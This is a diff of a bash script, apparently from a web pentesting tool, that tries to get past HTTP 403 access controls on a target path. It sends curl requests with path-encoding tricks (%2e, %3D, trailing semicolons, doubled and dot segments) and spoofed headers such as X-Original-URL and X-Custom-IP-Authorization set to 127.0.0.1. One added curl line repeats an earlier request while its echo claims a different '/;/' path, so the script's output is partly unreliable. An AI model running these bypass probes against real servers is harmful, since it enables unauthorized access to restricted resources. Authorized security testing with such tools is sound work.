@@ -7,12 +7,22 @@ curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
 echo "  --> ${1}/${2}"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
 echo "  --> ${1}/%2e/${2}"
+
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%3D/$2
+echo "  --> ${1}/%3D/${2}"
+
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
 echo "  --> ${1}/${2}/."
+
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/;
+echo "  --> ${1}/${2}/;"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
 echo "  --> ${1}//${2}//"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
 echo "  --> ${1}/./${2}/./"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
+
+echo "  --> ${1}/;/${2}/;/"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $2" $1/$2
 echo "  --> ${1}/${2} -H X-Original-URL: ${2}"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
